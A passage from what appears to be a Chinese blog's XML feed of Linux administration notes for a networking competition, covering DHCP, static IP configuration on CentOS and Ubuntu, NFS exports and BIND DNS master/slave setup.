IP<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="三、实例"><a href="#三、实例" class="headerlink" title="三、实例"></a>三、实例</h2><h3 id="1、拷贝模板文件"><a href="#1、拷贝模板文件" class="headerlink" title="1、拷贝模板文件"></a>1、拷贝模板文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#  删除原配置文件（原配置文件内无参数）<br>rm -f /etc/dhcp/dhcpd.conf<br>#  拷贝模板文件并更名为配置文件<br>cp -p /usr/share/doc/dhcp-4.2.5/dhcpd.conf.example /etc/dhcp/dhcpd.conf<br>#  备份配置文件<br>cp -p /etc/dhcp/dhcpd.conf /etc/dhcp/dhcpd.conf.bak_2020.11.13<br></code></pre></td></tr></table></figure><h3 id="2、编辑配置文件"><a href="#2、编辑配置文件" class="headerlink" title="2、编辑配置文件"></a>2、编辑配置文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#  可在配置文件内只保留如下内容（配置文件内有该内容）<br>subnet 192.168.1.0 netmask 255.255.255.0 &#123;    #  声明子网<br>  range 192.168.1.1 192.168.1.253;    #  设置范围<br>  option domain-name-servers 114.114.114.114;#  设置 DNS<br>  option domain-name &quot;www.test.com&quot;;  #  设置 DNS 域<br>  option routers 192.168.1.254;       #  设置网关<br>  option broadcast-address 192.168.1.255;#  设置广播地址<br>  default-lease-time 600; #  默认租期（单位：秒）<br>  max-lease-time 7200;    #  最大租期（单位：秒）<br>&#125;<br><br>host fantasia &#123;<br>  hardware ethernet 08:00:07:26:c0:a5;  #  设置目标主机的 MAC 地址<br>  fixed-address 192.168.1.111;          #  设置为其分配的保留 IP<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络应用竞赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Network</title>
      <link href="/2021/02/09/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E7%AB%9E%E8%B5%9B/Network/Network/"/>
      <url>/2021/02/09/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E7%AB%9E%E8%B5%9B/Network/Network/</url>
      
        <content type="html"><![CDATA[<h2 id="一、网卡命名规范（设备类型-设备位置-数字）"><a href="#一、网卡命名规范（设备类型-设备位置-数字）" class="headerlink" title="一、网卡命名规范（设备类型 + 设备位置 + 数字）"></a>一、网卡命名规范（设备类型 + 设备位置 + 数字）</h2><p><strong>设备类型：</strong></p><table><thead><tr><th align="center">格式</th><th align="left">描述</th></tr></thead><tbody><tr><td align="center">en</td><td align="left">以太网（Ethernet）</td></tr><tr><td align="center">ib</td><td align="left">无限宽带（InfiniBand）</td></tr><tr><td align="center">sl</td><td align="left">串列线路互联网协议（slip：Serial line IP）</td></tr><tr><td align="center">wl</td><td align="left">无线局域网（WLAN）</td></tr><tr><td align="center">www</td><td align="left">无线广域网（WWAN）</td></tr></tbody></table><p><strong>设备位置：</strong></p><table><thead><tr><th align="center">格式</th><th align="left">描述</th></tr></thead><tbody><tr><td align="center">o</td><td align="left">集成设备</td></tr><tr><td align="center">s</td><td align="left">扩展槽的索引号</td></tr><tr><td align="center">x</td><td align="left">基于 MAC 进行命名</td></tr><tr><td align="center">p</td><td align="left">PCI 扩展总线</td></tr></tbody></table><p><strong>实例：</strong></p><table><thead><tr><th align="left">格式</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">eth0</td><td align="left">默认的网卡名</td></tr><tr><td align="left">eno1</td><td align="left">主板 BIOS 内置的网卡</td></tr><tr><td align="left">ens1</td><td align="left">主板 BIOS 内置的 PCI 网卡（PCI：主板上的一个插槽）</td></tr><tr><td align="left">enp0s2</td><td align="left">PCI 独立网卡（PCI：主板上的一个插槽）</td></tr><tr><td align="left">wlp3s0</td><td align="left">PCI 无线网卡（PCI：主板上的一个插槽）</td></tr><tr><td align="left">wwp0s29f7u2i2</td><td align="left">4G modem</td></tr><tr><td align="left">wlp0s2f1u4u1</td><td align="left">连接在 USB Hub 上的无线网卡</td></tr><tr><td align="left">enx78e7d1ea46da</td><td align="left">PCI 网卡（PCI：主板上的一个插槽）</td></tr></tbody></table><h2 id="二、Centos-配置静态-IP"><a href="#二、Centos-配置静态-IP" class="headerlink" title="二、Centos 配置静态 IP"></a>二、Centos 配置静态 IP</h2><p>Centos7 默认网络配置文件路径为：<code>/etc/sysconfig/network-scripts/ifcfg-eth0</code> （有一些默认文件则是 <code>ifcfg-ens33</code> 或是其他的）</p><p>1、编辑配置文件 <code>ifcfg-eth0</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#  在文件中找到如下内容<br>BOOTPROTO=dhcp    #  将文件中的这行修改为 static<br>IPV4_FAILURE_FATAL=no#  将文件中的这行修改为 yes<br>ONBOOT=no   #  将文件中的这行修改为 yes<br><br>#  在文件末尾添加如下内容<br>IPADDR=10.1.82.232    #  网卡 IP<br>NETMASK=255.255.255.0#  子网掩码<br>GATEWAY=10.1.82.254#  网关<br>DNS1=8.8.8.8#  首选 DNS<br></code></pre></td></tr></table></figure><p>2、<code>ifcfg-eth0</code> 文件详解</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">TYPE=Ethernet#  网卡类型<br>PROXY_METHOD=none#  代理方式（默认关闭）<br>BROWSER_ONLY=no    #  代理设置是否仅用于浏览器<br>BOOTPROTO=static#  网卡的引导协议（static：静态 IP，dhcp：动态 IP，none：不启用）<br>DEFROUTE=yes#  默认路由<br>IPV4_FAILURE_FATAL=yes#  是否开启 IPV4 致命错误检测<br>IPV6INIT=yes#  IPV6 是否自动初始化<br>IPV6_AUTOCONF=yes#  IPV6 是否自动配置<br>IPV6_DEFROUTE=yes#  IPV6 是否可以为默认路由<br>IPV6_FAILURE_FATAL=no#  是否开启 IPV6 致命错误检测<br>IPV6_ADDR_GEN_MODE=stable-privacy#  IPV6 地址生成模型<br>NAME=eth0<br>UUID=b3942c00-c0e4-45e8-8e4d-f1dd06ab9a09#  统用唯一识别码（不能跟其他 UUID 重复）<br>DEVICE=eth0#  网卡名称<br>ONBOOT=yes#  是否开机自启<br><br>IPADDR=10.1.82.232    #  网卡 IP<br>NETMASK=255.255.255.0#  子网掩码<br>GATEWAY=10.1.82.254#  网关<br>DNS1=8.8.8.8#  首选 DNS<br></code></pre></td></tr></table></figure><p>3、配置完后需重启服务<br>重启网络：<code>systemctl restart network</code><br>停止：<code>systemctl stop network</code><br>开启：<code>systemctl start network</code><br>查看状态：<code>systemctl status network</code></p><h2 id="三、Ubuntu-配置静态-IP"><a href="#三、Ubuntu-配置静态-IP" class="headerlink" title="三、Ubuntu 配置静态 IP"></a>三、Ubuntu 配置静态 IP</h2><p>1、如配置文件路径为 <code>/etc/network/interfaces／interfaces</code>，则在文件末尾添加如下内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#  添加网卡 eth0 并设置为 static（静态 IP）模式<br>auto eth0<br>iface eth0 inet static<br>address 192.168.1.123#  网卡 IP<br>netmask 255.255.255.0#  子网掩码<br>gateway 192.168.1.1#  网关<br>dns 114.114.114.114#  dns<br></code></pre></td></tr></table></figure><p>配置完成后需重启服务<br>重启网络：<code>sudo systemctl restart network</code><br>停止：<code>sudo systemctl stop network</code><br>开启：<code>sudo systemctl start network</code><br>查看状态：<code>sudo systemctl status network</code></p><p>２、如配置文件路径为：<code>/etc/netplan/01-network-manager-all.yaml</code>，则在文件末尾添加如下内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">静态 IP 配置文件内容如下：<br>network:<br>    version: 2<br>    renderer: NetworkManager<br>    ethernets:<br>        ens33:#  配置的网卡名称（可使用 ip a 查看）<br>            dhcp4: no#  dhcp4关闭<br>            dhcp6: no<br>            addresses: [192.168.1.233/23]#  IP及掩码<br>            gateway4: 192.168.0.1#  网关<br>            nameservers:<br>                 addresses: [114.114.114.114,180.76.76.76]<br><br>动态 IP 配置文件内容如下：<br>network:<br>  version: 2<br>  renderer: NetworkManager<br>  ethernets:<br>     ens33:     # 配置的网卡名称（可使用 ip a 查看）<br>       dhcp4: true      # dhcp4开启<br>       addresses: []    # IP及掩码<br>       optional: true<br></code></pre></td></tr></table></figure><p>使配置生效命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">sudo netplan apply<br></code></pre></td></tr></table></figure><p>如果配置生效后旧 IP 依然存在则使用命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">sudo ip addr flush dev ens33<br>sudo ifdown ens33<br>sudo ifup ens33<br>sudo netplan apply<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络应用竞赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NFS</title>
      <link href="/2021/02/09/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E7%AB%9E%E8%B5%9B/NFS/NFS/"/>
      <url>/2021/02/09/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E7%AB%9E%E8%B5%9B/NFS/NFS/</url>
      
        <content type="html"><![CDATA[<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p><code>NFS</code>（网络文件系统）能通过网络让不同的机器、系统共享彼此的文件</p><p>配置文件（默认为空文件）：<code>/etc/exports</code><br>管理命令：<code>/usr/sbin/exportfs</code><br>共享资源的日志文件：<code>/var/lib/nfs/*tab</code><br>客户端查询共享资源命令：<code>/usr/sbin/showmount</code></p><p><code>NFS</code> 服务主要进程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">rpc.nfsd#  最主要的 NFS 进程，管理客户端是否可登录<br>rpc.mountd#  挂载和卸载 NFS 文件系统，包括权限管理<br>rpc.lockkd#  管理文件锁，避免同时写出错（非必要）<br>rpc.statd#  检查文件一致性，可修复文件（非必要）<br></code></pre></td></tr></table></figure><h2 id="二、常用参数"><a href="#二、常用参数" class="headerlink" title="二、常用参数"></a>二、常用参数</h2><p><code>/etc/exports</code> 配置文件常用参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">ro#  只读<br>rw#  读写<br>sync#  将数据同步写入内存缓冲区与磁盘中（效率低，但可保证数据的一致性）<br>async#  将数据先保存在内存缓冲区中，必要时才写入磁盘<br>insecure#  允许客户端从大于 1024 的 TCP/IP 端口连接服务器<br>secure（默认）          #  限制客户端只能从小于 1024 的 TCP/IP 端口连接旧服务器<br>wdelay（默认）          #  检查是否有相关的写入操作，如有则将这些写入操作一起执行（该参数为默认参数）<br>subtree_check（默认）   #  若输出目录是一个子目录，则 NFS 服务器将检查其父目录的权限<br>no_subtree_check       #  即使输出目录是一个子目录，NFS 服务器也不检查其父目录的权限（可提高效率）<br>no_wdelay       #  若有写入操作则立即执行（应与 sync 配合使用）<br>root_squash     #  将来访问的 root 用户映射为匿名用户或用户组<br>no_root_squash#  访问用户先与本机用户匹配，匹配失败后在映射为匿名用户或用户组<br>all_squash      #  所有访问用户都映射为匿名用户或用户组<br>no_all_squash#  访问用户先与本机用户匹配，匹配失败后在映射为匿名用户或用户组<br></code></pre></td></tr></table></figure><h2 id="三、实例"><a href="#三、实例" class="headerlink" title="三、实例"></a>三、实例</h2><h3 id="1、编辑配置文件"><a href="#1、编辑配置文件" class="headerlink" title="1、编辑配置文件"></a>1、编辑配置文件</h3><p>配置文件格式为：<code>路径 + IP、掩码 + 参数</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#  创建需共享的文件夹<br>mkdir -p /data/web_data<br>#  在 /etc/exports 配置文件中添加如下内容<br>/data/web_data192.168.1.0/24(rw,no_root_squash)<br></code></pre></td></tr></table></figure><h3 id="2、刷新配置"><a href="#2、刷新配置" class="headerlink" title="2、刷新配置"></a>2、刷新配置</h3><p>刷新配置：<code>exportfs -a</code></p><h3 id="3、重启服务"><a href="#3、重启服务" class="headerlink" title="3、重启服务"></a>3、重启服务</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">systemctl restart rpcbind<br>systemctl restart nfs<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络应用竞赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DNS</title>
      <link href="/2021/02/09/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E7%AB%9E%E8%B5%9B/DNS/DNS/"/>
      <url>/2021/02/09/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E7%AB%9E%E8%B5%9B/DNS/DNS/</url>
      
        <content type="html"><![CDATA[<h2 id="配置-DNS"><a href="#配置-DNS" class="headerlink" title="配置 DNS"></a>配置 DNS</h2><p><strong>一、简介</strong></p><p>把域名翻译成IP地址的软件称为域名系统，即 DNS<br>默认端口号：<code>53</code></p><p><strong>默认配置文件路径：</strong></p><p>主要配置文件（定义 bind 服务程序的运行）： <code>/etc/named.conf</code><br>区域配置文件（保存域名和IP地址对应关系的所在位置）： <code>/etc/named.rfc1912.zones</code><br>数据文件目录： <code>/var/named</code></p><p>DNS域名解析的配置文件（系统自带）： <code>/etc/resolv.conf</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#  resolv.conf 参数详解<br><br>nameserver#  定义 DNS 服务器的 IP 地址（查询时按照 namserver 在文件中的顺序进行）<br>domain#  定义本地域名<br>search#  定义域名的搜索列表（当查询的域名没找到时，则从该参数声明的域中按前后顺序查找）<br>sortlist#  对返回的域名进行排序<br></code></pre></td></tr></table></figure><hr><h2 id="二、实例"><a href="#二、实例" class="headerlink" title="二、实例"></a>二、实例</h2><p><strong>环境：</strong></p><p>centos 7，IP：10.1.82.232</p><h3 id="1、安装相关包"><a href="#1、安装相关包" class="headerlink" title="1、安装相关包"></a>1、安装相关包</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#  安装 dns 相关包（bind：DNS 服务程序，bind-utils：提供 DNS 工具包（域名解析和DNS调试））<br>yum -y install bind bind-utils<br></code></pre></td></tr></table></figure><h3 id="2、编辑主要配置文件"><a href="#2、编辑主要配置文件" class="headerlink" title="2、编辑主要配置文件"></a>2、编辑主要配置文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">vim /etc/named.conf     #  编辑 named.conf<br><br>将    listen-on port 53 &#123; 127.0.0.1; &#125;;  跟  allow-query     &#123; localhost; &#125;;<br>改为  listen-on port 53 &#123; any; &#125;;        和  allow-query     &#123; any; &#125;; 即可<br></code></pre></td></tr></table></figure><p><code>named.conf</code> 配置文件详解</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#  named.conf 配置文件详解<br><br>//<br>// named.conf<br>//<br>// Provided by Red Hat bind package to configure the ISC BIND named(8) DNS<br>// server as a caching only nameserver (as a localhost DNS resolver only).<br>//<br>// See /usr/share/doc/bind*/sample/ for example named configuration files.<br>//<br>// See the BIND Administrator&#x27;s Reference Manual (ARM) for details about the<br>// configuration located in /usr/share/doc/bind-&#123;version&#125;/Bv9ARM.html<br><br>options &#123;<br>listen-on port 53 &#123; any; &#125;;                   #  允许所有 IP 监听本机 53 端口（即所有用户能与本机的 DNS 进行通信）<br>listen-on-v6 port 53 &#123; ::1; &#125;;                #  IPV6 监听地址<br>directory &quot;/var/named&quot;;              #  服务器的工作目录<br>dump-file &quot;/var/named/data/cache_dump.db&quot;;  #  当执行 rndc dumpdb 时服务器 dump 文件的路径<br>statistics-file &quot;/var/named/data/named_stats.txt&quot;;    #  当服务器接收到 rndc stats 命令时，追加统计数据的文件路径<br>memstatistics-file &quot;/var/named/data/named_mem_stats.txt&quot;;#  当退出服务器时，会将服务器的统计信息写道文件中<br>allow-query     &#123; any; &#125;;              #  允许所有 IP 进行 DNS 查询<br><br>/* <br> - If you are building an AUTHORITATIVE DNS server, do NOT enable recursion.<br> - If you are building a RECURSIVE (caching) DNS server, you need to enable <br>   recursion. <br> - If your recursive DNS server has a public IP address, you MUST enable access <br>   control to limit queries to your legitimate users. Failing to do so will<br>   cause your server to become part of large scale DNS amplification <br>   attacks. Implementing BCP38 within your network would greatly<br>   reduce such attack surface <br>*/<br>recursion yes;    #  允许进行递归搜索<br><br>dnssec-enable yes;      #  开启 DNSSEC 开关<br>dnssec-validation yes;#  开启 DNSSEC 确认开关<br><br>/* Path to ISC DLV key */<br>bindkeys-file &quot;/etc/named.iscdlv.key&quot;;    #  加密用的 key<br><br>managed-keys-directory &quot;/var/named/dynamic&quot;;#  管理密钥的路径<br><br>pid-file &quot;/run/named/named.pid&quot;;        #  服务器记录进程 ID 的文件路径<br>session-keyfile &quot;/run/named/session.key&quot;;    #  会话密钥文件<br>&#125;;<br><br>logging &#123;#  定义 bing 服务的日志<br>        channel default_debug &#123;    #  日志输出方式<br>                file &quot;data/named.run&quot;;  #  输出到指定文件<br>                severity dynamic;    #  按照服务器当前的 debug 级别记录日志<br>        &#125;;<br>&#125;;<br><br>zone &quot;.&quot; IN &#123;#  定义域区（一个 zone 关键字定义一个域区）<br>type hint;    #  定义类型（master：主域名服务器，slave：辅助域名服务器，hint：互联网中根域名服务器）<br>file &quot;named.ca&quot;;#  指定存放 DNS 记录文件的文件名（默认路径在 /var/named 下）<br>&#125;;<br><br>#  包含区域配置文件，用于设置正反向区域（也可在当前文件中配置正反向区域）<br>include &quot;/etc/named.rfc1912.zones&quot;;#  如果把该行注释则 named.rfc1912.zones 文件内的配置无效<br>include &quot;/etc/named.root.key&quot;;#  根区域的 key 文件（与事务签名相关）<br></code></pre></td></tr></table></figure><h3 id="3、编辑区域配置文件"><a href="#3、编辑区域配置文件" class="headerlink" title="3、编辑区域配置文件"></a>3、编辑区域配置文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">vim /etc/named.rfc1912.zones#  编辑区域文件<br><br>在文件末尾添加正反向区域<br>zone &quot;test.com&quot; IN &#123;#  定义正向域区（一个 zone 关键字定义一个域区）<br>type master;    #  定义类型（master：主域名服务器，slave：辅助域名服务器，hint：互联网中根域名服务器）<br>file &quot;test.com.zone&quot;;#  指定存放正向区域记录文件的文件名（默认路径在 /var/named 下）<br>allow-update &#123; none; &#125;;#  设置允许从何处动态更新 DNS记录 的客户端地址（做主从服务器时需用到，做主从时需把从处的 none 更改为主服务器的地址）<br>&#125;;<br><br>zone &quot;82.1.10.in-addr.arpa&quot; IN &#123;#  定义反向域区（一个 zone 关键字定义一个域区）<br>type master;        #  定义类型（master：主域名服务器，slave：辅助域名服务器，hint：互联网中根域名服务器）<br>file &quot;10.1.82.zone&quot;;#  指定存放正向区域记录文件的文件名（默认路径在 /var/named 下）<br>allow-update &#123; none; &#125;;#  设置允许从何处动态更新 DNS记录 的客户端地址（做主从服务器时需用到，做主从时需把从处的 none 更改为主服务器的地址）<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="4、配置正向区域"><a href="#4、配置正向区域" class="headerlink" title="4、配置正向区域"></a>4、配置正向区域</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#  复制 named.localhost 文件及其属性并改名为 test.com.zone 放置在原位置<br>cp -p /var/named/named.localhost /var/named/test.com.zone<br><br>#  配置正向区域文件<br>$TTL 1D<br>@IN SOA@ test.com. (<br>0; serial<br>1D; refresh<br>1H; retry<br>1W; expire<br>3H ); minimum<br>NS@<br><br>#  必须有一行不加前缀的（如没有不加前缀的这一行，则会报错）<br>A10.1.82.232      #  域名指向的 IP<br>wwwA10.1.82.232      #  域名前缀跟指向的 IP<br>AAAA::1<br></code></pre></td></tr></table></figure><h3 id="5、配置反向区域"><a href="#5、配置反向区域" class="headerlink" title="5、配置反向区域"></a>5、配置反向区域</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#  复制 named.loopback 文件及其属性并改名为 10.1.82.zone 放置在原位置<br>cp -p /var/named/named.loopback /var/named/10.1.82.zone<br><br>#  配置反向区域文件<br>$TTL 1D<br>@IN SOA@ test.com. (<br>0; serial<br>1D; refresh<br>1H; retry<br>1W; expire<br>3H ); minimum<br>NS@<br><br>#  必须有一行不加前缀的（如没有不加前缀的这一行，则会报错）<br>A10.1.82.232      #  域名指向的 IP<br>wwwA10.1.82.232      #  域名前缀跟指向的 IP<br>AAAA::1<br>232PTRwww.test.com.    #  完整的域名跟对应的 IP 后缀（域名后面的点必须有）<br></code></pre></td></tr></table></figure><h3 id="6、设置-DNS-解析"><a href="#6、设置-DNS-解析" class="headerlink" title="6、设置 DNS 解析"></a>6、设置 DNS 解析</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">vim /etc/resolv.conf    #  编辑 DNS 域名解析配置文件<br><br>nameserver 10.1.82.232      #  在 resolv.conf 文件末尾添加该行<br></code></pre></td></tr></table></figure><p><code>systemctl restart named</code> 配置完后需使用该命令重启服务</p><p>配置完后使用 nslookup dig 等工具进行测试即可</p><hr><h2 id="配置主从-DNS"><a href="#配置主从-DNS" class="headerlink" title="配置主从 DNS"></a>配置主从 DNS</h2><h3 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h3><p><strong>环境：</strong></p><p>centos 7（主），IP：10.1.82.232<br>centos 7（从），IP：10.1.82.235</p><h3 id="二、实例-1"><a href="#二、实例-1" class="headerlink" title="二、实例"></a>二、实例</h3><p>主服务器的配置文件照上正常配置即可</p><p>从服务器只需在区域配置文件末尾中添加如下配置即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">zone &quot;test.com&quot; IN &#123;#  定义正向域区（一个 zone 关键字定义一个域区）<br>        type slave;    #  定义类型（master：主域名服务器，slave：辅助域名服务器，hint：互联网中根域名服务器）<br>        masters &#123; 10.1.82.232; &#125;;    #  设置主服务器的 IP<br>        file &quot;slaves/test.com.zone&quot;;#  设置主服务器正向区域的文件名<br>        allow-update &#123; 10.1.82.232; &#125;;#  设置主服务器的 IP（即允许从该地址获取动态更新 DNS 记录）<br>&#125;;<br><br>zone &quot;82.1.10.in-addr.arpa&quot; IN &#123;        #  定义反向域区（一个 zone 关键字定义一个域区）<br>        type slave;                     #  定义类型（master：主域名服务器，slave：辅助域名服务器，hint：互联网中根域名服务器）<br>        masters &#123; 10.1.82.232; &#125;;    #  设置主服务器的 IP<br>        file &quot;slaves/10.1.82.zone&quot;;    #  设置主服务器反向区域的文件名<br>        allow-update &#123; 10.1.82.232; &#125;;#  设置主服务器的 IP（即允许从该地址获取动态更新 DNS 记录）<br>&#125;;<br></code></pre></td></tr></table></figure><p><code>systemctl restart named</code> 配置完后需使用该命令重启服务</p><p>配置完后使用 nslookup dig 等工具进行测试即可</p>]]></content>
      
      
      <categories>
          
          <category> 网络应用竞赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SELinux 防火墙</title>
      <link href="/2021/02/09/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E7%AB%9E%E8%B5%9B/SELinux/SELinux/"/>
      <url>/2021/02/09/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E7%AB%9E%E8%B5%9B/SELinux/SELinux/</url>
      
